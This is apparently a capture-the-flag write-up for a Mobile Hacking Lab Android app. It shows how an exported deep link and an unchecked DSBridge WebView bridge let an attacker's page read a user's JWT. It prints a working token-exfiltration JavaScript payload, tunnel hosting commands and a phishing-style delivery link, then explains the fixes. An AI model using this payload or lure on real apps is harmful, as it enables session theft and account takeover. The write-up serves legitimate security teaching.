---
title: "MHL TokenBleed Writeup"
date: 2026-10-25
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, deep-link, webview, dsbridge, javascript-interface, jwt, account-takeover, exfiltration]
---

Mobile Hacking Lab, Android, WebView bridge

## TL;DR

The app exposes an exported deep link (`mhlcrypto://showPage?url=...`) that loads any `http(s)` URL into a WebView. That WebView has a DSBridge JavaScript object registered with no origin check, and one of its methods, `getUserAuth`, returns the logged-in user's JWT. An attacker hosts a page that calls the bridge and beacons the token out, then sends the victim a single link. One tap, full session theft.

## Objective

Exfiltrate the user's authentication token remotely, as a one-click account takeover. Local exploitation (for example `adb`) does not count as a valid solution, so the delivery has to work from a link opened in a browser.

## Recon

I decompiled the APK with JADX and started with the manifest.

```
jadx -d app mhl-lab-tokenbleed.apk
cat app/resources/AndroidManifest.xml
```

Three things stood out:

- `SplashActivity` is `exported="true"` and has a `BROWSABLE` intent filter for the `mhlcrypto` scheme. That is the remote entry point.
- `LoginActivity`, `MainActivity` and `DWebViewActivity` are all `exported="false"`, so they can only be reached through `SplashActivity`.
- `usesCleartextTraffic="false"`, so the WebView will only load HTTPS pages. This matters later for the attacker's hosting.

## Following the Intent

**SplashActivity** checks whether a token exists in `TokenManager`. If it does, it builds an intent for `MainActivity` and copies over the original `data` and `action`. If not, it goes to the login screen and drops the deep link. This matches the lab rule to log in once first.

**MainActivity.handleIntent** is where the attacker input is consumed:

```java
if ("showPage".equals(data.getHost())) {
    String url = data.getQueryParameter("url");
    Intent i = new Intent(this, DWebViewActivity.class);
    i.putExtra("url_to_load", url);
    startActivity(i);
}
```

The `url` parameter is fully attacker controlled. `DWebViewActivity` only checks that it starts with `http`. There is no host allowlist.

**DWebViewActivity** configures the WebView with file access disabled (so the usual `file://` tricks are off the table), then registers the bridge:

```java
dwebview.addJavascriptObject(new JsApi(this), null);
```

That call is the heart of the bug. Whatever page loads here, including a page on the attacker's domain, can call into `JsApi`.

## The Bridge

`JsApi` exposes two methods:

```java
@JavascriptInterface
public final void getUserAuth(Object args, CompletionHandler<Object> handler) {
    String token = new TokenManager(this.context).getToken();
    handler.complete(token != null ? new JSONObject(token)
                                   : new JSONObject().put("error", "No token found"));
}

@JavascriptInterface
public final void openNewWindow(Object args) { /* loads another http URL */ }
```

`getUserAuth` reads the JWT out of `EncryptedSharedPreferences` (key `user_auth_data`) and hands it straight to the caller. The encryption at rest is irrelevant here, because the app decrypts it itself on request. Nothing checks who is asking.

## Understanding DSBridge

This is not the classic `addJavascriptInterface` pattern, and that is where payloads silently fail. `DWebView` and `addJavascriptObject` belong to the DSBridge library.

- The native side only injects a low-level hook. The page has to include the `dsbridge` JS library itself to get the `dsBridge` object.
- Native methods are not called by name on a global. You go through `dsBridge.call("method", arg, callback)`.
- `getUserAuth` takes a `CompletionHandler`, which makes it an **async** method. From JS, the callback you pass receives the result.
- The namespace argument was `null`, so the method is called as `getUserAuth`, not `ns.getUserAuth`.

## Exploit

The page needs the DSBridge JS file next to it:

```
wget https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.js
```

`p.html`:

```html
<script src="dsbridge.js"></script>
<script>
  function b(s){ new Image().src = "/b?s=" + encodeURIComponent(s); }
  b("loaded");
  b("dsBridge type: " + typeof dsBridge);
  dsBridge.call("getUserAuth", {}, function (res) {
    b("data=" + JSON.stringify(res));
  });
</script>
```

The `Image().src` beacon avoids CORS problems, since all that matters is that the request arrives. The staged `b(...)` calls show exactly where the chain stops if it breaks.

## Hosting: HTTPS is mandatory

Because cleartext traffic is disabled, `http://` URLs and `127.0.0.1` over plain HTTP are refused. An `adb reverse` setup does not work either, and it would not be remote anyway. I served the page locally and exposed it through a Cloudflare quick tunnel:

```
python3 -m http.server 8888
cloudflared tunnel --url http://localhost:8888
```

The `http.server` access log doubles as the collector. A `404` on `/b` is fine, because the query string is still logged.

## Delivery

Local test with `adb`, once the app was installed and logged in:

```
adb shell am start -a android.intent.action.VIEW \
  -d "mhlcrypto://showPage?url=https%3A%2F%2FYOUR-TUNNEL.trycloudflare.com%2Fp.html"
```

For the remote requirement, the attacker hosts a page with a link and sends it to the victim:

```html
<a href="mhlcrypto://showPage?url=https%3A%2F%2FYOUR-TUNNEL.trycloudflare.com%2Fp.html">Claim your reward</a>
```

When the victim taps it in Chrome, Android resolves the `mhlcrypto` scheme to `SplashActivity`, which forwards to `MainActivity`, which opens the attacker's page in `DWebViewActivity`. If the plain link does not launch the app, the `intent://` form works as an alternative:

```
intent://showPage?url=https%3A%2F%2FYOUR-TUNNEL.trycloudflare.com%2Fp.html#Intent;scheme=mhlcrypto;end
```



## Result

The server log received the beacon with the token wrapped in a DSBridge response (`code`, `data.authtoken`). Decoding the JWT payload (the middle segment, base64url):

```
{"name":"Test","email":"test@tsst.net","audit_ref":"MHL{w3bv1ew_br1dg3_pwned_gg}","tier":"Silver","iat":...,"exp":...}
```

The flag, `MHL{w3bv1ew_br1dg3_pwned_gg}`, was in the `audit_ref` claim. The token lifetime (`exp` minus `iat`) is 3600 seconds, so each stolen token is valid for one hour. That limits the replay window, but the attacker gets a fresh token on every click.



## Attack Chain Summary

1. Victim taps a link to `mhlcrypto://showPage?url=<attacker page>`.
2. Exported `SplashActivity` forwards the intent to `MainActivity` (victim is logged in).
3. `MainActivity.handleIntent` launches `DWebViewActivity` with the attacker URL. No allowlist.
4. `DWebViewActivity` loads the page and registers `JsApi` on it. No origin check.
5. Attacker JS calls `dsBridge.call("getUserAuth")` and receives the JWT.
6. JS beacons the token to the attacker's server.

## Root Causes and Fixes

- **No URL allowlist.** The deep link should only load URLs on hosts the app owns. Validate the parsed host against an explicit list, not a `startsWith("http")` check.
- **Bridge exposed to untrusted origins.** Register the bridge only when the page's origin is trusted, and re-check the origin inside sensitive methods. Do not attach the bridge to a WebView that can navigate anywhere.
- **Token returned over the bridge.** Web content rarely needs the raw JWT. Return the minimum (for example a display name) or use short-lived, scoped tokens meant for the web layer.
- **Exported deep link into authenticated flows.** Consider requiring a confirmation step, or use verified App Links instead of a custom scheme that any app or web page can trigger.

## Lessons

- Check which bridge library you are dealing with. DSBridge's call convention differs from plain `addJavascriptInterface`, and a wrong guess fails silently.
- Read the manifest for cleartext rules before choosing how to host your payload.
- Instrument the payload in stages so a failure tells you which link of the chain broke.
- Encryption at rest does not help when the app hands the decrypted secret to any caller that asks.
